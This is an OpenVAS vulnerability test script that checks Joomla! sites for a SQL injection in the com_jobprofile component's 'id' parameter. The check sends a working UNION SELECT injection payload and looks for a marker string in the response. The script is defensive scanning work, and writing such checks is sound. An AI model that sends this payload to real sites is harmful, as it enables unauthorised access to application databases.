###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_50891.nasl 11449 2018-09-18 10:04:42Z mmartin $
#
# Joomla! 'com_jobprofile' Component 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103357");
  script_bugtraq_id(50891);
  script_version("$Revision: 11449 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! 'com_jobprofile' Component 'id' Parameter SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50891");
  script_xref(name:"URL", value:"http://extensions.joomla.org/extensions/ads-a-affiliates/jobs-a-recruitment/11924");
  script_xref(name:"URL", value:"http://www.joomla.org/");

  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2011-12-06 11:26:21 +0100 (Tue, 06 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Joomla! 'com_jobprofile' component is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);

url = string(dir, "/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9--");

if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {

  security_message(port:port);
  exit(0);

}

exit(0);
